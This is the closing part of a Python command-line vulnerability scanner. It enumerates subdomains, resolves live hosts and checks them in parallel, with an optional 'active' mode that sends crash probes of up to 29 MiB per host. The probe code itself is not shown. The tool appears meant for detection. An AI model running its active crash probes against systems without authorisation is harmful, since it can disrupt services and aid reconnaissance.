    parser.add_argument("--version", action="version", version=f"%(prog)s {VERSION}")

    return parser


def main() -> None:
    args = build_parser().parse_args()

    if args.threads < 1:
        raise SystemExit("--threads must be at least 1")
    if args.timeout < 1:
        raise SystemExit("--timeout must be at least 1")

    if args.no_color or not sys.stdout.isatty():
        for attr in ("RED", "GREEN", "YELLOW", "CYAN", "WHITE", "BOLD", "RESET"):
            setattr(Colors, attr, "")

    try:
        custom_headers = _parse_headers(args.headers)
    except ValueError as exc:
        raise SystemExit(str(exc)) from exc

    # ── Build target URL list ──────────────────────────────────────────────────

    raw_hosts: List[str] = []

    if args.url:
        raw_hosts = [args.url]

    elif args.list:
        raw_hosts = _load_lines(args.list, "host list")

    elif args.domain:
        if not args.quiet:
            print_banner()
            print(colorize(f"[*] Enumerating subdomains for: {args.domain}", Colors.CYAN))

        subdomains = enumerate_subdomains(args.domain, quiet=args.quiet)
        if not subdomains:
            raise SystemExit("No subdomains found — try -l with a pre-built list.")

        if not args.quiet:
            print(colorize(f"[*] {len(subdomains)} unique subdomains found", Colors.CYAN))
            print(colorize(f"[*] Resolving DNS ...", Colors.CYAN))

        live = resolve_live(subdomains, threads=args.dns_threads)
        if not live:
            raise SystemExit("No subdomains resolved in DNS.")

        if not args.quiet:
            dead = len(subdomains) - len(live)
            print(colorize(f"[*] {len(live)} live hosts  ({dead} NXDOMAIN)", Colors.CYAN))

        raw_hosts = hosts_to_urls(live)

    hosts = _deduplicate(raw_hosts)
    if not hosts:
        raise SystemExit("No hosts to scan.")

    # ── Paths ──────────────────────────────────────────────────────────────────

    paths: Optional[List[str]] = None
    if args.path_file:
        paths = _load_lines(args.path_file, "path file")
    elif args.paths:
        paths = args.paths

    # ── Banner & config ────────────────────────────────────────────────────────

    if not args.quiet and not args.domain:
        print_banner()

    if not args.quiet:
        dup_count = len(raw_hosts) - len(hosts)
        if dup_count:
            print(colorize(f"[*] Skipped {dup_count} duplicate host(s)", Colors.CYAN))
        print(colorize(f"[*] {len(hosts)} host(s) to scan", Colors.CYAN))
        if paths:
            print(colorize(f"[*] {len(paths)} custom path(s)", Colors.CYAN))
        else:
            print(colorize(f"[*] Default path: {DEFAULT_PATH}", Colors.CYAN))
        print(colorize(f"[*] Threads: {args.threads}  Timeout: {args.timeout}s  SAPI: {args.sapi}", Colors.CYAN))
        if args.insecure:
            print(colorize("[!] TLS verification disabled", Colors.YELLOW))
        if args.active:
            print(colorize("[!] ACTIVE mode: crash probes will be sent (up to 29 MiB per host)", Colors.RED + Colors.BOLD))
        else:
            print(colorize("[*] Passive / version-only mode (no crash probes)", Colors.GREEN))
        print()

    verify_ssl = not args.insecure

    # Pre-build probe bodies to catch config errors early
    if args.active and len(hosts) > 1:
        for probe in PROBES:
            _build_probe_body(*probe)

    # ── Scan ───────────────────────────────────────────────────────────────────

    results: List[dict] = []
    vulnerable_count = 0

    def do_scan(host: str) -> dict:
        try:
            return scan_host(host, args.timeout, verify_ssl, custom_headers, args.sapi, args.active, paths)
        except Exception as exc:
            r = _base_result(host)
            r["error"] = f"unexpected error: {exc}"
            r["reason"] = r["error"]
            return r

    if len(hosts) == 1:
        result = do_scan(hosts[0])
        results.append(result)
        _print_result(result, args.verbose, args.quiet)
        if result.get("vulnerable") is True:
            vulnerable_count += 1
    else:
        with ThreadPoolExecutor(max_workers=args.threads) as executor:
            futures = {executor.submit(do_scan, h): h for h in hosts}
            with tqdm(total=len(hosts), unit="host", disable=args.quiet, ncols=72, desc="Scanning") as bar:
                for fut in as_completed(futures):
                    result = fut.result()
                    results.append(result)
                    if result.get("vulnerable") is True:
                        vulnerable_count += 1
                    _print_result(result, args.verbose, args.quiet)
                    bar.update(1)

    _print_summary(results, args.active)

    if args.output:
        _save_results(results, args.output, args.all_results)

    sys.exit(0 if vulnerable_count == 0 else 1)


if __name__ == "__main__":
    main()
